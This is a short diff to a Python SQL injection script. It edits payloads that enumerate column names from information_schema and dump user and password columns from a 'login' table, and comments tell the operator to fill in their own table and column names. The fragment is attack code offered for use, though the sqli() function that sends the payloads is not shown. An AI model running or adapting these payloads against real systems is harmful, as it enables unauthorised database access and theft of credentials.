@@ -67,10 +67,10 @@ if options.table:
 
 if options.column:
         #update tablename here
-        payload = "select group_concat(column_name) from information_schema.tables where table_name='tablename' limit 1"
+        payload = "select group_concat(column_name) from information_schema.columns where table_name='tablename' limit 1"
         print sqli(payload)
 
 if options.dump:
         #update user,pass with ur column
-        payload = "select group_concat(user,pass) from login limit 1"
+        payload = "select group_concat(user) from login limit 1"
         print sqli(payload)
